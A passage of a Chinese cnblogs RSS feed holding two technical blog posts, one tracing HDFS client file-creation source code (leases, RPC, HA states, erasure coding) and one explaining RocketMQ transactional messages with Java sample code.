            clientMachine, flag, createParent, replication, blockSize, feInfo,
            toRemoveBlocks, shouldReplicate, ecPolicyName, logRetryCache);
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//设置文件租约的方法见FSDirWriteFileOp
 fsn.leaseManager.addLease(
        newNode.getFileUnderConstructionFeature().getClientName(),
        newNode.getId());
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;FileLease&lt;/strong&gt;：文件租约，HDFS给客户端发放一个写文件操作的临时许可证，只有持有该证件者才允许操作此文件，从而保证保证数据的一致。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;每个客户端用户持有一个文件租约。&lt;/li&gt;
&lt;li&gt;每个文件租约内部包含有一个租约持有者信息，还有租约对应的文件Id列表，即当前租约持有者正在写这些文件Id对应的文件。&lt;/li&gt;
&lt;li&gt;每个文件租约内包含有一个最新近更新时间，最近更新时间将会决定此租约是否已过期。过期的租约会导致租约持有者无法继续执行写数据到文件中，除非进行租约的更新。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;既然每个客户端都有一个文件租约，那么HDFS如如何管理的呢？比如有些客户端用户写某文件后未及时关闭此文件。这样会导致租约未释放，从而造成其他用户无法对此文件进行写操作。答案就是LeaseManager，运行在Active NameNode的服务中。它主要做2件事：&lt;br/&gt;1、维护HDFS内部当前所有的租约，&lt;br/&gt;2、定期释放过期的租约对象。&lt;/p&gt;
&lt;p&gt;补充：HDFS 只允许对一个已打开的文件顺序写入，或者在现有文件的末尾追加数据。&lt;/p&gt;
&lt;h2 id=&quot;26、rpc机制-2&quot;&gt;2.6、RPC机制&lt;/h2&gt;
&lt;p&gt;接下来我们的代码将进入&lt;code&gt;DFSOutputStream.newStreamForCreate()&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//调用namenode的文件创建方法
 stat = dfsClient.namenode.create(src, masked, dfsClient.clientName,
              new EnumSetWritable&amp;lt;&amp;gt;(flag), createParent, replication,
              blockSize, SUPPORTED_CRYPTO_VERSIONS, ecPolicyName)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们再次暂停一下，点击“这里的namenode实际是&lt;code&gt;ClientProtocol&lt;/code&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;ClientProtocol is used by user code via the DistributedFileSystem class to communicate with the NameNode. User code can manipulate the directory namespace, as well as open/close file streams, etc.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ClientProtocol用来通过DistributedFileSystem类与NameNode通信。可以操作目录名称空间，以及打开/关闭文件流等。&lt;code&gt;ClientProtocol&lt;/code&gt;是一个接口，它的实现类有：&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200329201411536.png&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;我们进入&lt;code&gt;NameNodeRpcServer.create()&lt;/code&gt;方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt; @Override 
  public HdfsFileStatus create(String src, FsPermission masked,
      String clientName, EnumSetWritable&amp;lt;CreateFlag&amp;gt; flag,
      boolean createParent, short replication, long blockSize,
      CryptoProtocolVersion[] supportedVersions, String ecPolicyName)
      throws IOException {
    //确认namenode已启动
    checkNNStartup();
    // 获取服务端ip
    String clientMachine = getClientMachine();
    if (stateChangeLog.isDebugEnabled()) {
      stateChangeLog.debug(&quot;*DIR* NameNode.create: file &quot;
          +src+&quot; for &quot;+clientName+&quot; at &quot;+clientMachine);
    }
    //检查是否可以写入。在生成上namenode正常也会进行HA，保证高可用。只有主的才可以写入，
    if (!checkPathLength(src)) {
      throw new IOException(&quot;create: Pathname too long.  Limit &quot;
          + MAX_PATH_LENGTH + &quot; characters, &quot; + MAX_PATH_DEPTH + &quot; levels.&quot;);
    }
    namesystem.checkOperation(OperationCategory.WRITE);
    CacheEntryWithPayload cacheEntry = RetryCache.waitForCompletion(retryCache, null);
    if (cacheEntry != null &amp;amp;&amp;amp; cacheEntry.isSuccess()) {
      return (HdfsFileStatus) cacheEntry.getPayload();
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;作为分布式文件系统，少不了各个节点之间的通信和交互，比如client和namenode，namenode和datanode，所以需要这样一套RPC（Remote Procedure CallProtocol，远程过程调用协议）框架，允许程序像调用本地方法一样调用远程机器上应用程序提供的服务。Hadoop RPC并没有采用JDK自带的RMI，据说基于Google Protocol Buffer(简称Protobuf)来实现的。Hadoop的RPC和通用的RPC一样，包含通信模块、客户端Stub程序、服务端Stub程序、请求程序、服务程序等。&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2020032920285656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phNW9u,size_16,color_FFFFFF,t_70&quot; alt=&quot;Hadoop RPC Client 处理过程&quot;/&gt;&lt;br/&gt;Hadoop RCP 主要提供两个接口&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//构造一个客户端代理对象，用于向服务器发送RPC请求
public static &amp;lt;T&amp;gt;ProtocolProxy &amp;lt;T&amp;gt; getProxy/waitForProxy() 
// 为某个协议实例构造一个服务器对象，用于处理客户端发送的请求
public static Server RPC.Builder (Configuration).build() 
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;27、hastate：active、standby&quot;&gt;2.7、HAState：active、standby&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    HdfsFileStatus status = null;
    try {
      PermissionStatus perm = new PermissionStatus(getRemoteUser()
          .getShortUserName(), null, masked);
          // 开始创建文件
      status = namesystem.startFile(src, perm, clientName, clientMachine,
          flag.get(), createParent, replication, blockSize, supportedVersions,
          ecPolicyName, cacheEntry != null);
    } finally {
      RetryCache.setState(cacheEntry, status != null, status);
    }

    metrics.incrFilesCreated();
    metrics.incrCreateFileOps();
    return status;
  }
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt; @Override
  // 报错 
  public void checkOperation(final OperationCategory op)
      throws StandbyException {
    state.checkOperation(haContext, op);
  }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在这个代码里有一个HA状态的检查，standby 只能read，不能write。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;  public static final HAState ACTIVE_STATE = new ActiveState();
  public static final HAState STANDBY_STATE = new StandbyState();
  public static final HAState OBSERVER_STATE = new StandbyState(true);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从Hadoop2开始，增加了对HDFS高可用（HA）的支持，配置了1对active-standby的namenode。当活动的namenode失效，备用的namenode能够快速（几十秒的时间）实现任务接管，因为最新的状态存储在内存中：包括最新的编辑日志条目和最新的数据块映射信息。实际观察到的失效时间略长一点，需要1分钟左右，这是因为系统需要保守确定活动的namenode是否真的失效了。假设活动的namenode和备用的namenode都失效了（人品爆发了），管理员依旧可以声明一个备用namenode并实现冷启动。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;实际开发踩坑&lt;/strong&gt;&lt;br/&gt;在实际开发过程中，由于配置或者启动顺序的原因，倒是会经查遇到standby的问题，甚至发现master和slave两个NameNode的状态均为standby。比如启动了hdfs再启动zookeeper 导致zookeeper的选举机制zkfc（DFSZKFailoverController）没有格式化 NameNode节点的自动切换机制没有开启 两个NameNode都处于standby状态（解决方案：先启动zookeeper集群：zkServer.sh start 再启动hdfs集群FSNamesystem）。&lt;/p&gt;
&lt;p&gt;人工查看namenode的方法&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-Bash&quot;&gt;sudo -E -u hadoop /home/hadoop/bin/hdfs haadmin -getServiceState nn1
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;28、hadoop3x新特性：纠删码-2&quot;&gt;2.8、Hadoop3.x新特性：纠删码&lt;/h2&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private HdfsFileStatus startFileInt(String src,
      PermissionStatus permissions, String holder, String clientMachine,
      EnumSet&amp;lt;CreateFlag&amp;gt; flag, boolean createParent, short replication,
      long blockSize, CryptoProtocolVersion[] supportedVersions,
      String ecPolicyName, boolean logRetryCache) throws IOException

 //检查冗余策略：副本或者纠删码
 boolean shouldReplicate = flag.contains(CreateFlag.SHOULD_REPLICATE);
 //文件写入锁
writeLock(); 
 //根据文件目录字符串实例化目录结构。比如/hdfs/madashu，在hdfs里需要把目录结构映射成对象
  iip = FSDirWriteFileOp.resolvePathForStartFile(
          dir, pc, src, flag, createParent);

 feInfo = FSDirEncryptionZoneOp.getFileEncryptionInfo(
              dir, iip, ezInfo);
// 添加到文件目录树中：检查文件是否已经存在，是否可覆盖，文件数量的限制，纠删码格式存储，获取纠删码策略，创建文件节点等。
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里面出现了一个新的名词：&lt;strong&gt;纠删码，Erasure Coding，EC&lt;/strong&gt;。前面章节我们提到了默认情况下，HDFS的数据块都会保存三个副本。副本提供了一种简单而健壮的冗余方式来最大化保证数据的可用性。数据的多副本同时可以尽量保证计算任务的本地化。&lt;strong&gt;但副本方式成本是较高的&lt;/strong&gt;：默认情况下三副本方式会在存储空间或其他资源(比如写入数据时的网络带宽)中产生200%的开销。对于较少访问的数据集(对集群的I/O影响相对不大)，它们的第二个或者第三个副本会比较少访问，但是仍会消耗相同的存储空间。因此可以使用纠删码来代替多副本的方式，它使用更少的存储却可以保证相同级别的容错。在典型配置下，与三副本方式相比，EC可以将存储成本降低约50%。但同样他的使用也是需要一些代价的，一旦数据需要恢复，他会造成2大资源的消耗:&lt;br/&gt;1、网络带宽的消耗，因为数据恢复需要去读其他的数据块和校验块&lt;br/&gt;2、进行编码，解码计算需要消耗CPU资源&lt;br/&gt;具体可参见https://cloud.tencent.com/developer/article/1363388&lt;/p&gt;
&lt;h2 id=&quot;29、文件透明加密处理和目录树&quot;&gt;2.9、文件透明加密处理和目录树&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;目录树&lt;/strong&gt;：&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200329164228878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phNW9u,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200329163938437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phNW9u,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;在2.8 的代码中，还出现了目录树和文件加密，这一块就不做多讲了。分享两个相关的链接：&lt;br/&gt;《HDFS文件目录详解》&lt;a href=&quot;https://blog.csdn.net/baiye_xing/article/details/76268495&quot;&gt;https://blog.csdn.net/baiye_xing/article/details/76268495&lt;/a&gt;&lt;br/&gt;《HDFS数据加密空间--Encryption zone》&lt;a href=&quot;https://www.cnblogs.com/bianqi/p/12183761.html&quot;&gt;https://www.cnblogs.com/bianqi/p/12183761.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;210、hdfs客户端写流程总结-2&quot;&gt;2.10、HDFS客户端写流程总结&lt;/h2&gt;
&lt;p&gt;以上源码才完成了文件创建过程，接下来还需要通过管道方式将文件写入datanode中去，后续有机会再和大家一些学习分享。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    // 创建文件。
    FSDataOutputStream outputStream =
            fileSystem.create(new Path(&quot;/hdfs/madashu/test&quot;));
    // 写入文件内容
    outputStream.write(&quot;你好Hadoop,我是码大叔&quot;.getBytes());
    outputStream.flush();
    IOUtils.closeStream(outputStream);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以下文字来自于《Hadoop权威指南》一书，对HDFS客户端写流程进行了总结，作为本文的收尾，想大牛致敬！&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200329170157689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phNW9u,size_16,color_FFFFFF,t_70&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;br/&gt;&lt;strong&gt;1、创建文件&lt;/strong&gt;&lt;br/&gt;HDFS客户端写一个新的文件时，会首先调用DistributedFileSystem.create()方法在HDFS文件系统中创建一个新的空文件。这个方法在底层会通过调用ClientProtocol.create()方法通知Namenode执行对应的操作，Namenode会首先在文件系统目录树中的指定路径下添加一个新的文件，然后将创建新文件的操作记录到editlog 中。完ClientProtocol.create()调用后，DistributedFileSystem.create()方法就会返回一个HdfsDataOutputStream对象，这个对象在底层包装了一个DFSOutputStream对象，真正执行写数据操作的其实是DFSOutputStream对象。&lt;br/&gt;&lt;strong&gt;2、 建立数据流管道&lt;/strong&gt;&lt;br/&gt;获取了 DFSOutputStream对彖后，HDFS客户端就可以调用DFSOutputStream.write()方法来写数据了。由于 DistributedFileSystem.create()方法只是在文件系统目录树中创建了一个空文件，并没有申请任何数据块，所以DFSOutputStream 会首先调用 ClientProtocol.addBlock()向 Namenode 申请一个新的空数据块，addBlock()方法会返冋一个LocatedBlock对象，这个对象保存了存储这个数据块的所有数据节点的位置信息。获得了数据流管道中所有数据节点的信息后，DFSOutputStream就可以建立数据流管道写数据块了。&lt;br/&gt;&lt;strong&gt;3、通过数据流管道写入数据&lt;/strong&gt;&lt;br/&gt;成功地建立数据流管道后，HDFS客户端就可以向数据流管道写数据了。写入DFSOutputStream中的数据会先被缓存在数据流中，之后这些数据会被切分成一个个数据包(packet)通过数据流管道发送到所有数据节点。这里的每个数据包都会按照上图所示，通过数据流管道依次写入数据节点的本地存储。每个数据包都有个确认包，确认包会逆序通过数据流管道回到输出流。输出流在确认了所有数据节点已经写入这个数据包之后，就会从对应的缓存队列删除这个数据包。当客户端写满一个数据块之后，会调用addBlock()申请一个新的数据块，然后循环执行上述操作。&lt;br/&gt;&lt;strong&gt;4、关闭输入流并提交文件&lt;/strong&gt;&lt;br/&gt;当HDFS客户端完成了整个文件中所有数据块的写操作之后，就可以调用close()方法关闭输出流，并调用ClientProtocol.completeO方法通知Namenode提交这个文件中的所有数据块，也就完成了整个文件的写入流程。&lt;/p&gt;
&lt;p&gt;对于Datanode ,当Datanode成功地接受一个新的数据块时，Datanode会通过&lt;br/&gt;DatanodeProtocol.blockReceivedAndDeleted()方法向 Namenode 汇报，Namenode 会更新内存中的数据块与数据节点的对应关系。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;我的个人微信公众号：“&lt;strong&gt;码大叔&lt;/strong&gt;”，架构师，十年戎“码”，老“叔”开花，我们一起学习交流！&lt;br/&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20200329211311802.jpg&quot; alt=&quot;在这里插入图片描述&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文参考&lt;/strong&gt;：&lt;br/&gt;《Hadoop权威指南》&lt;br/&gt;《Hadoop 2.X HDFS源码剖析 》&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/joqk/p/3963101.html&quot;&gt;https://www.cnblogs.com/joqk/p/3963101.html&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://blog.csdn.net/baiye_xing/article/details/76268495&quot;&gt;https://blog.csdn.net/baiye_xing/article/details/76268495&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://blog.csdn.net/androidlushangderen/article/details/52850349&quot;&gt;https://blog.csdn.net/androidlushangderen/article/details/52850349&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;http://blog.itpub.net/69908606/viewspace-2648472/&quot;&gt;http://blog.itpub.net/69908606/viewspace-2648472/&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://cloud.tencent.com/developer/article/1363388&quot;&gt;https://cloud.tencent.com/developer/article/1363388&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Mon, 30 Mar 2020 00:23:00 +0000</pubDate>
<dc:creator>码大叔</dc:creator>
<og:description>本文将通过一个演示工程来快速上手java调用HDFS的常见操作。接下来通过阅读HDFS的源码，一步步展开HDFS相关原理、理论知识的说明。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/madashu/p/12596421.html</dc:identifier>
</item>
<item>
<title>还不知道事务消息吗？这篇文章带你全面扫盲！ - 楼下小黑哥</title>
<link>http://www.cnblogs.com/goodAndyxublog/p/12596402.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/goodAndyxublog/p/12596402.html</guid>
<description>&lt;p&gt;在分布式系统中，为了保证数据一致性是必须使用分布式事务。分布式事务实现方式就很多种，今天主要介绍一下使用 RocketMQ 事务消息，实现分布事务。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;文末有彩蛋，看完再走&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;为什么需要事务消息？&quot;&gt;为什么需要事务消息？&lt;/h2&gt;
&lt;p&gt;很多同学可能不知道事务消息是什么，没关系，举一个真实业务场景，先来带你了解一下普通的消息存在问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075824993-1468007004.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面业务场景中，当用户支付成功，将会更新支付订单，然后发送 MQ 消息。手续费系统将会通过拉取消息，计算手续费然后保存到另外一个手续费数据库中。&lt;/p&gt;
&lt;p&gt;由于计算手续费这个步骤可以离线计算，所以这里采用 MQ 解耦支付与计算手续费的流程。&lt;/p&gt;
&lt;p&gt;流程主要涉及三个步骤：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;更新订单数据&lt;/li&gt;
&lt;li&gt;发送消息给 MQ&lt;/li&gt;
&lt;li&gt;手续费系统拉取消息&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上面提到的步骤，任何一个都会失败，如果我们没有处理，就会使两边数据不一致，将会造成下面两种情况：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;订单数据更新了，手续费数据没有生成&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;手续费数据生成，订单数据却没有更新&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;这可是涉及到真正的钱，一旦少计算，就会造成&lt;strong&gt;资损&lt;/strong&gt;，真的赔不起！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075825474-890873601.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;对于最后一步来讲，比较简单。如果消费消息失败，只要没有提交消息确认，MQ 服务端将会自动重试。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;最大的问题&lt;/strong&gt;在于我们无法保证更新操作与发送消息一致性。无论我们采用先更新订单数据，再发送消息，还是先发送消息，再更新订单数据，都在存在一个成功，一个失败的可能。&lt;/p&gt;
&lt;p&gt;如下所示，采用先发送消息，然后再更新数据库的方式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075825603-20159732.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面流程消息发送成功之后，再进行本地事务的提交。这个流程看起来很完美，但是想象一下，如果在提交事务时数据库执行失败，导致事务回滚了。&lt;/p&gt;
&lt;p&gt;然而此时消息已经发送出去，无法撤回。这就导致手续费系统紧接会消费消息，计算手续费并更新到数据库中。这就造成支付数据未更新，手续费系统却生成的不一致的情况。&lt;/p&gt;
&lt;p&gt;那如果我们流程反一下，是不是就好了呢？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075825783-201322041.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们使用下面的伪码表示：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 开始事务
try {
    // 1.执行数据库操作
    // 2.提交事务
}catch (Exception e){
    // 3.回滚事务
}
// 4.发送 mq 消息
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里如果事务提交成功，但是 mq 消息发送失败，就会导致支付数据更新但是手续费数据未生成的的不一致情况。&lt;/p&gt;
&lt;p&gt;这里有的同学可能会想到，将发送 mq 消息步骤移动到事务中，消息发送失败，回滚事务，不就完美了吗？&lt;/p&gt;
&lt;p&gt;伪码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 开始事务
try {
  // 1.执行数据库操作
  // 2.发送 mq 消息
  // 3.提交事务
}catch (Exception e){
  // 4.回滚事务
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面代码看起来确实没什么问题，消息发送失败，回滚事务。&lt;/p&gt;
&lt;p&gt;但是实际上第二步有可能存在消息已经发送到 MQ 服务端，但是由于网络问题未及时收到 MQ 的响应消息，从而导致消息发送端认为消息消息发送失败。&lt;/p&gt;
&lt;p&gt;这就会导致订单事务回滚了，但是手续费系统却能消费消息，两边数据库又不一致了。&lt;/p&gt;
&lt;p&gt;熟悉 MQ 的同学，可能会想到，消息发送失败，可以重试啊。&lt;/p&gt;
&lt;p&gt;是的，我们可以增加重试次数，重新发送消息。但是这里我们需要注意，由于消息发送耦合在事务中，过多的重试会拉长数据库事务执行时间，事务处理时间过长，导致事务中锁的持有时间变长，影响整体的数据库吞吐量。&lt;/p&gt;
&lt;p&gt;实际业务中，不太建议将消息发送耦合在数据库事务中。&lt;/p&gt;
&lt;h2 id=&quot;事务消息&quot;&gt;事务消息&lt;/h2&gt;
&lt;p&gt;事务消息是 RocketMQ 提供的&lt;strong&gt;事务&lt;/strong&gt;功能，可以实现分布式事务，从而保证上面事务操作与消息发送要么都成功，要么都失败。&lt;/p&gt;
&lt;p&gt;使用事务消息，整体流程如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075825968-521099781.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;首先我们将会发送一个半(&lt;strong&gt;half&lt;/strong&gt;) 消息到 MQ 中，通知其开启一个事务。这里半消息并不是说消息内容不完整，实际上它包含所有完整的消息内容。&lt;/p&gt;
&lt;p&gt;这个半消息与普通的消息唯一的区别在于，在事物提交之前，这个消息对消费者来说是&lt;strong&gt;不可见&lt;/strong&gt;的，消费者不会消费这个消息。&lt;/p&gt;
&lt;p&gt;一旦半消息发送成功，我们就可以执行数据库事务。然后根据事务的执行结果再决定提交或回滚事务消息。&lt;/p&gt;
&lt;p&gt;如果事务提交成功，将会发送确认消息至 MQ，手续费系统就可以成功消费到这条消息。&lt;/p&gt;
&lt;p&gt;如果事务被回滚，将会发送回滚通知至 MQ，然后 MQ 将会删除这条消息。对于手续费系统来说，都不会知道这条消息的存在。&lt;/p&gt;
&lt;p&gt;这就解决了要么都成功，要么都失败的一致性要求。&lt;/p&gt;
&lt;p&gt;实际上面的流程还是存在问题，如果我们&lt;strong&gt;提交/回滚&lt;/strong&gt;事务消息失败怎么办？&lt;/p&gt;
&lt;p&gt;对于这个问题，RocketMQ 给出一种&lt;strong&gt;事务反查&lt;/strong&gt;的机制。我们需要需要注册一个回调接口，用于反查本地事务状态。&lt;/p&gt;
&lt;p&gt;RocketMQ 若未收到提交或回滚的请求，将会定期去反查回调接口，然后可以根据反查结果决定回滚还是提交事务。&lt;/p&gt;
&lt;p&gt;RocketMQ 事务消息流程整体如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202003/1419561-20200330075826122-1719090786.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;事务消息示例代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class TransactionMQProducerExample {
    public static void main(String[] args) throws MQClientException, InterruptedException, UnsupportedEncodingException {
        TransactionMQProducer producer = new TransactionMQProducer(&quot;test_transaction_producer&quot;);
        // 不定义将会使用默认的
        ExecutorService executorService =
                new ThreadPoolExecutor(2, 5, 100,
                        TimeUnit.SECONDS, new ArrayBlockingQueue&amp;lt;Runnable&amp;gt;(2000), 
                                       new ThreadFactory() {
                    @Override
                    public Thread newThread(Runnable r) {
                        Thread thread = new Thread(r);
                        thread.setName(&quot;client-transaction-msg-check-thread&quot;);
                        return thread;
                    }
                });
        producer.setExecutorService(executorService);
        TransactionListener transactionListener = new TransactionListenerImpl();
        producer.setTransactionListener(transactionListener);
        // 改成自己的地址
        producer.setNamesrvAddr(&quot;127.0.0.1:9876&quot;);
        producer.start();

        Order order = new Order(&quot;66666&quot;, &quot;books&quot;);

        Message msg =
                new Message(&quot;transaction_tp&quot;,
                        JSON.toJSONString(order).getBytes(RemotingHelper.DEFAULT_CHARSET));
        // 发送半消息
        SendResult sendResult = producer.sendMessageInTransaction(msg, null);
        System.out.println(sendResult.getSendStatus());
        producer.shutdown();
    }

    public static class TransactionListenerImpl implements TransactionListener {

        /**
         * 半消息发送成功将会自动执行该逻辑
         *
         * @param msg
         * @param arg
         * @return
         */
        @Override
        public LocalTransactionState executeLocalTransaction(Message msg, Object arg) {
            // 执行本地事务
            Order order = null;
            try {
                order = JSON.parseObject(new String(msg.getBody(),
                        RemotingHelper.DEFAULT_CHARSET), Order.class);
                boolean isSuccess = updateOrder(order);
                if (isSuccess) {
                    // 本地事务执行成功，提交半消息
                    System.out.println(&quot;本地事务执行成功，提交事务事务消息&quot;);
                    return LocalTransactionState.COMMIT_MESSAGE;
                } else {
                    // 本地事务执行成功，回滚半消息
                    System.out.println(&quot;本地事务执行失败，回滚事务消息&quot;);
                    return LocalTransactionState.ROLLBACK_MESSAGE;
                }
            } catch (Exception e) {
                System.out.println(&quot;本地事务执行异常&quot;);
            }
            // 异常情况返回未知状态
            return LocalTransactionState.UNKNOW;
        }

        /**
         * 更新订单
         * 这里模拟数据库更新，返回事务执行成功
         *
         * @param order
         * @return
         */
        private boolean updateOrder(Order order) throws InterruptedException {
            TimeUnit.SECONDS.sleep(1);
            return true;
        }

        /***
         * 若提交/回滚事务消息失败，rocketmq 自动反查事务状态
         * @param msg
         * @return
         */
        @Override
        public LocalTransactionState checkLocalTransaction(MessageExt msg) {
            try {
                Order order = JSON.parseObject(new String(msg.getBody(),
                        RemotingHelper.DEFAULT_CHARSET), Order.class);
                boolean isSuccess = queryOrder(order.getOrderId());
                if (isSuccess) {
                    // 本地事务执行成功，提交半消息
                    return LocalTransactionState.COMMIT_MESSAGE;
                } else {
                    // 本地事务执行成功，回滚半消息
                    return LocalTransactionState.ROLLBACK_MESSAGE;
                }

            } catch (Exception e) {
                System.out.println(&quot;查询失败&quot;);
            }
            // 异常情况返回未知状态
            return LocalTransactionState.UNKNOW;
        }

        /**
         * 查询订单状态
         * 模拟返回查询成功
         *
         * @param orderId
         * @return
         */
        private boolean queryOrder(String orderId) throws InterruptedException {
            TimeUnit.SECONDS.sleep(1);
            return true;
        }
    }

    @Data
    public static class Order {
        private String orderId;

        private String goods;

        public Order(String orderId, String goods) {
            this.orderId = orderId;
            this.goods = goods;
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面代码中：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;我们需要为生产者指定一个&lt;strong&gt;唯一&lt;/strong&gt;的 &lt;code&gt;ProducerGroup&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;需要继承 &lt;code&gt;TransactionListener&lt;/code&gt; 注解回调接口，其中 &lt;code&gt;executeLocalTransaction&lt;/code&gt; 方法执行本地事务，&lt;code&gt;checkLocalTranscation&lt;/code&gt; 用来执行检查本地事务。&lt;/li&gt;
&lt;li&gt;返回事务状态有三种：
&lt;ul&gt;&lt;li&gt;LocalTransactionState.UNKNOW 中间状态，RocketMQ 将会反查&lt;/li&gt;
&lt;li&gt;LocalTransactionState.COMMIT_MESSAGE 提交事务，消息这后续将会消费这条消息&lt;/li&gt;
&lt;li&gt;LocalTransactionState.ROLLBACK_MESSAGE，回滚事务，RocketMQ 将会删除这条消息&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;事务消息使用注意点&quot;&gt;事务消息使用注意点&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;事务消息最大反查次数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;由于单个消息反查次数过多，将会导致半消息队列堆积，影响性能。 RocketMQ 默认将单个消息的检查次数限制为 15 次。&lt;/p&gt;
&lt;p&gt;我们可以通过修改 &lt;code&gt;broker&lt;/code&gt; 配置文件，增加如下配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-conf&quot;&gt;# N 为最大检查次数
transactionCheckMax=N
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当检查次数超过最大次数后，RocketMQ 将会丢弃消息并且打印错误日志。&lt;/p&gt;
